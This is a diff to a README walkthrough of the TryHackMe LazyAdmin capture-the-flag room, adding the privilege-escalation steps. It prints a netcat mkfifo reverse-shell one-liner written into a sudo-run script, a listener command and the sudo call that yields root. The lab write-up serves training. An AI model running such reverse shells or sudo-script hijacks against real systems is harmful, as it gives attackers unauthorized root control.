@@ -4,7 +4,7 @@ This is a tutorial for the TryHackMe LazyAdmin challenge. A link to this challen
 Below are the primary tools I used for completing this challenge:
 * Nmap
 * Gobuster
-* Crackstation.net
+* [Crackstation](https://crackstation.net/)
 * [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
 ## Step 1: Recon, Scanning, and Enumeration
 We'll start by conducting recon of our target, scanning for open ports and services, then enumerating directories.
@@ -130,11 +130,52 @@ We'll start by conducting recon of our target, scanning for open ports and servi
         
 ![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/87285be0-397f-4773-a957-2094060f1412)
  
-3. The highlighted portion of the results above are the main thing of interest to us. 
+3. The highlighted portion of the results above are the main thing of interest to us. This tells us we can run the file **backup.pl** as sudo. This is likely a good place to insert our reverse shell to get root-level access.
 
+4. We don't have permissions to directly edit **backup.pl**, but we can read its contents using `cat`.  
 
+![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/7c32f06c-bcce-4f8f-9544-9076ef258a5f)
 
+5. It looks like all this file is doing is executing a different file called **copy.sh** located in the **/etc/** folder.
 
+6. Read the contents of **copy.sh** to see what this file does.
+
+![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/a6cf53d3-59dd-4e50-a92a-490126d2b690)
+
+    * It looks like copy.sh is, itself, a reverse shell.
+
+7. Now we'll need to edit copy.sh so that it connects to our attacking machine's IP and a port of our choice.
+    * We're not able to use `nano` or `vim` to edit the file, but we can use `echo` to write to it.
+  
+8. Using the `echo` command, replace the contents of copy.sh with a shell of our choice. We'll use the exact text that is already in there, but will replace the IP with our attacking machine's IP, and replace the port with a port of our choice:
+
+    * `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.171.217 8888 >/tmp/f" > copy.sh`
+    * This will overwrite the contents of copy.sh with our shell.
+  
+9. Now, it's time to set up a netcat listener to get ready to catch this shell. Open a new terminal and set up a netcat listener on the port you chose (in our case, it's port 8888):
+
+    * `nc -lvnp 8888`
+
+10. Once our listener is set up, it's time to execute backup.pl, which will also execute copy.sh. We can do this using the following command, which we saw earlier when we ran `sudo -l`:
+
+    * `sudo /usr/bin/perl /home/itguy/backup.pl`
+
+11. Now we have root!
+
+![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/ef6c9df5-c5c0-4762-82c3-33e5f026086e)
+
+12. The final step is getting the root flag. We'll search for it using `locate`: `locate root.txt 2>/dev/null`
+
+![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/325e6d90-c2c8-4137-97c7-9d99ea954afa)
+
+13. Then we'll read it using `cat`: `cat /root/root.txt`:
+
+![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/cdab857a-5ede-4230-83b7-47a1b95483f6)
+
+## Conclusion/Next Steps
+Congratulations! You've completed the LazyAdmin challenge on TryHackMe!
+
+An optional next step is do your own writeup of this challenge. This will help with your writing and reporting skills, and will also help you learn the material more deeply. 
 
 
 
